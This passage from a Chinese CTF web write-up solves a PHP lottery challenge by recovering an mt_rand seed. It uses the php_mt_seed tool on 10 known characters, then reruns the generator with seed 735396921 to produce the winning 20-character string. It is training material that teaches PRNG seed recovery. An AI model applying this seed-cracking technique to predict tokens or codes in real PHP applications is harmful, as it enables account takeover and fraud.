class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br></code></pre></td></tr></table></figure>
+<p>通过上面的代码可以发现，首先使用rand(0,999999999);函数确认种子，然后再由种子生成了20位的随机数<br>现在10位序列是我们所已知的，我们需要从这10位序列爆破出它的种子值<br>执行上面的操作<br>先将我们的序列转换为php_mt_seed可以识别的格式<br><img src="/images/Z4G7O5TWL8KY09.png" srcset="/img/loading.gif" lazyload></p>
+<p>后使用</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">./php_mt_seed<span class="hljs-number"> 30 </span>30<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 50 </span>50<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 22 </span>22<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 38 </span>38<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 8 </span>8<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 55 </span>55<span class="hljs-number"> 0 </span>61 <span class="hljs-number"> 19 </span>19<span class="hljs-number"> 0 </span>61<br></code></pre></td></tr></table></figure>
+<p><img src="/images/L7EBWVPZMJ2KLWYNUOI.png" srcset="/img/loading.gif" lazyload><br>命令获得种子<br>然后把种子插入再执行一遍题目的源代码即可获得20位随机数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">735396921</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//4jjTOwCiTtBHTQBt4oBa</span><br></code></pre></td></tr></table></figure>
+<p>成功反推，获得了flag<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35493457/article/details/124080444">CTF_Web：php伪随机数mt_rand()函数+php_mt_seed工具使用</a></p>
 
                 
               </div>
